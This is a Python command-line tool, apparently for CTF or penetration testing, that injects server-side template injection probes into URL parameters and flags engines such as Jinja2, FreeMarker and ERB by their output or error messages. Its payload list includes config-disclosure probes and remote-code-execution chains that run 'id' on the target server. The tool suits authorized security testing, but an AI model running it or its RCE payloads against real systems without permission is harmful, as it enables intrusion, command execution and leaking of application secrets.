#!/usr/bin/env python3
"""
Server-Side Template Injection (SSTI) tester.
Injects polyglot and engine-specific probes into parameters and detects
template evaluation via numeric expression results, error messages, or
known engine fingerprints.
Requires: requests
"""

import argparse
import re
import sys

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests", file=sys.stderr)
    sys.exit(1)

# ── Probe payloads ─────────────────────────────────────────────────────────────
# Each entry: (payload, expected_result_regex_or_string, engine_hint)

PROBES = [
    # Arithmetic detection probes
    ("{{7*7}}",                    r"49",             "Jinja2 / Twig"),
    ("${7*7}",                     r"49",             "FreeMarker / Velocity"),
    ("#{7*7}",                     r"49",             "Thymeleaf / SpEL"),
    ("<%= 7*7 %>",                 r"49",             "ERB (Ruby)"),
    ("{{7*'7'}}",                  r"7777777|49",     "Jinja2 vs Twig"),
    ("${{7*7}}",                   r"49",             "Jinja2 (JS hybrid)"),
    ("{7*7}",                      r"49",             "Smarty"),
    ("{{=7*7}}",                   r"49",             "Pebble"),
    ("%{7*7}",                     r"49",             "OGNL / Struts"),
    ("*{7*7}",                     r"49",             "Spring SpEL"),

    # String operations
    ("{{\"test\"}}",               r"test",           "Jinja2"),
    ("${'test'}",                  r"test",           "Groovy"),

    # Config / env disclosure
    ("{{config}}",                 r"SECRET|Config|app|debug",  "Jinja2 config"),
    ("{{self}}",                   r"TemplateReference|jinja",  "Jinja2 self"),
    ("{{7*7}}{{config.items()}}",  r"49",             "Jinja2 compound"),

    # RCE probes (detection only — look for output, not execution)
    ("{{''.__class__.__mro__[1].__subclasses__()}}",
     r"subprocess|Popen|os\._",                       "Jinja2 RCE chain"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
     r"uid=",                                          "FreeMarker RCE"),
    ("<%= `id` %>",                r"uid=",           "ERB RCE"),
]

# Engine-specific error fingerprints
ERROR_FINGERPRINTS = {
    "Jinja2":      ["jinja2", "TemplateSyntaxError", "UndefinedError"],
    "Twig":        ["twig", "Twig_Error_Syntax", "Twig\\Error"],
    "FreeMarker":  ["freemarker", "FreeMarker template error"],
    "Velocity":    ["velocity", "VelocityException"],
    "Smarty":      ["smarty", "Smarty error"],
    "Pebble":      ["pebble", "PebbleException"],
    "Thymeleaf":   ["thymeleaf", "TemplateInputException"],
    "ERB":         ["erb", "(erb):"],
    "Mako":        ["mako", "mako.exceptions"],
    "Tornado":     ["tornado.template"],
}


def make_session(headers: list[str]) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (CTF-SSTI)"
    for h in headers:
        k, _, v = h.partition(":")
        s.headers[k.strip()] = v.strip()
    return s


def inject(session, url, method, param, payload, base_data, timeout):
    try:
        if method == "GET":
            r = session.get(url, params={param: payload}, timeout=timeout,
                            verify=False, allow_redirects=True)
        else:
            data = {**base_data, param: payload}
            r = session.post(url, data=data, timeout=timeout, verify=False,
                             allow_redirects=True)
        return r
    except Exception:
        return None


def detect_engine_from_error(body: str) -> list[str]:
    found = []
    bl = body.lower()
    for engine, fingerprints in ERROR_FINGERPRINTS.items():
        if any(fp.lower() in bl for fp in fingerprints):
            found.append(engine)
    return found


def test_param(session, url, method, param, base_data, timeout, stop_first):
    print(f"\n[*] Parameter: {param!r}  ({len(PROBES)} probes)\n")

    # Baseline
    try:
        if method == "GET":
            baseline = session.get(url, params={param: "SSTI_BASELINE_TEST"},
                                   timeout=timeout, verify=False)
        else:
            baseline = session.post(url, data={**base_data, param: "SSTI_BASELINE_TEST"},
                                    timeout=timeout, verify=False)
        base_size = len(baseline.content)
    except Exception:
        base_size = 0

    hits = []
    for payload, expected_re, hint in PROBES:
        r = inject(session, url, method, param, payload, base_data, timeout)
        if r is None:
            continue

        body = r.text
        matched_re = re.search(expected_re, body)
        engine_from_error = detect_engine_from_error(body)
        size_diff = len(r.content) - base_size

        if matched_re:
            print(f"  [+] SSTI CONFIRMED  payload={payload!r}")
            print(f"      Engine hint: {hint}")
            print(f"      Matched: {matched_re.group()!r}")
            print(f"      Status: {r.status_code}  Size: {len(r.content)}B")
            snippet = body[:300].replace('\n', '\\n')
            print(f"      Snippet: {snippet}\n")
            hits.append({"param": param, "payload": payload, "hint": hint,
                         "match": matched_re.group()})
            if stop_first:
                break
        elif engine_from_error:
            print(f"  [~] Engine error detected  payload={payload!r}  engines={engine_from_error}")
        else:
            print(f"  [-] {payload!r:<50} {r.status_code}  {size_diff:+}B")

    return hits


def main():
    parser = argparse.ArgumentParser(description="SSTI tester for common template engines")
    parser.add_argument("--url",    required=True, help="Target URL")
    parser.add_argument("--param",  action="append", default=[], dest="params",
                        required=True, metavar="NAME",
                        help="Parameter(s) to test (repeatable)")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data",   default="", help="Base POST data (key=val&...)")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--headers", action="append", default=[], metavar="H:V")
    parser.add_argument("--stop-first", action="store_true", dest="stop_first",
                        help="Stop after first confirmed SSTI per parameter")
    args = parser.parse_args()

    session = make_session(args.headers)
    base_data = {}
    if args.data:
        for part in args.data.split("&"):
            k, _, v = part.partition("=")
            base_data[k] = v

    print(f"[*] Target: {args.url}  Method: {args.method}")

    all_hits = []
    for param in args.params:
        all_hits += test_param(session, args.url, args.method, param,
                               base_data, args.timeout, args.stop_first)

    if all_hits:
        print(f"\n[+] {len(all_hits)} SSTI finding(s):")
        for h in all_hits:
            print(f"    param={h['param']!r}  payload={h['payload']!r}  engine={h['hint']}")
    else:
        print("\n[-] No SSTI detected")


if __name__ == "__main__":
    main()
